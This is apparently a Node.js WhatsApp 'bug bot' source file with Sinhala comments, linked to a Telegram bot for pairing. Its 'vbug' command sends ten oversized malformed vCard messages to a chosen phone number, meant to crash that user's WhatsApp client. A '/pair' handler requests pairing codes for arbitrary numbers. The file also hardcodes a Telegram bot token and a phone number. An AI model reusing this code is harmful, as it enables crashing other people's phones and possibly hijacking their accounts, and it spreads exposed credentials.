const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V5", "Chrome", "20.0.04"]
    });

    // --- [ 🛠️ TELEGRAM HANDLER - මේකෙන් තමයි කෝඩ් එක එවන්නේ ] ---
    tgBot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        // ඔයා බොට්ට ඕනම මැසේජ් එකක් (Hi, Start, Pair) ගැහුවම මේක වැඩ කරනවා
        if (text === '/start' || text.toLowerCase() === 'hi' || text.toLowerCase() === 'pair') {
            tgBot.sendMessage(chatId, `👋 *Hello Sasiya MD!*\n\nඔයාගේ WhatsApp (${ownerNumber}) සඳහා Pairing Code එක දැන් රික්වෙස්ට් කරනවා. තත්පර කිහිපයක් ඉන්න...`, { parse_mode: "Markdown" });

            try {
                // WhatsApp එකෙන් කෝඩ් එක ඉල්ලනවා
                let code = await sock.requestPairingCode(ownerNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;

                // සැනින් ටෙලිග්‍රෑම් එකට මැසේජ් එක යවනවා
                await tgBot.sendMessage(chatId, `🔥 *YOUR WHATSAPP CODE:* \n\n\`${code}\` \n\nමේක ඉක්මනට WhatsApp එකේ ගහන්න මචං!`, { parse_mode: "Markdown" });
                console.log(`✅ Code Sent to Telegram Chat ID: ${chatId}`);
            } catch (err) {
                tgBot.sendMessage(chatId, "❌ කෝඩ් එක ගන්න බැරි වුණා. බොට් දැනටමත් ලොග් වෙලා ඇති.");
            }
        }

        // වෙනත් අයට කෝඩ් එක දෙන්න ඕනෙ නම් (උදා: /pair 947xxxxxxxx)
        if (text.startsWith('/pair ')) {
            let targetNum = text.replace('/pair ', '').replace(/[^0-9]/g, '');
            tgBot.sendMessage(chatId, `⏳ *${targetNum}* සඳහා කෝඩ් එක හදනවා...`);
            
            const tempDir = `temp_${targetNum}`;
            const { state: tState } = await useMultiFileAuthState(tempDir);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }), browser: ["Nexus-V5", "Safari", "1.0"] });

            setTimeout(async () => {
                try {
                    let tCode = await tSock.requestPairingCode(targetNum);
                    await tgBot.sendMessage(chatId, `🔥 *CODE FOR ${targetNum}:* \n\n\`${tCode}\``, { parse_mode: "Markdown" });
                    if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true });
                } catch (e) { tgBot.sendMessage(chatId, "❌ Error! ආයෙ ට්‍රයි කරන්න."); }
            }, 5000);
        }
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ 💀 WHATSAPP COMMANDS & BUG MENU ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        if (command === 'menu') {
            const menu = `
⚡ *NEXUS-MD V5.0 ULTIMATE BUG MENU* ⚡

👋 *Hello Sasiya MD!*
🛡️ *Status:* Online ✅

*─── [ 💀 BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash ⚰️
◈ ${prefix}cbug - Char Overflow Bug
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}crash - System Total Freeze

*─── [ 🛠️ TOOLS ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}reboot - Restart

🚀 *Powered by Developer Nexus*
🛡️ *Pairing: Telegram Bot*
            `;

            await sock.sendMessage(from, { text: menu });
        }

        // Vcard Bug Attack
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(350);
            await sock.sendMessage(from, { text: "💀 Vcard Crash Starting..." });
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
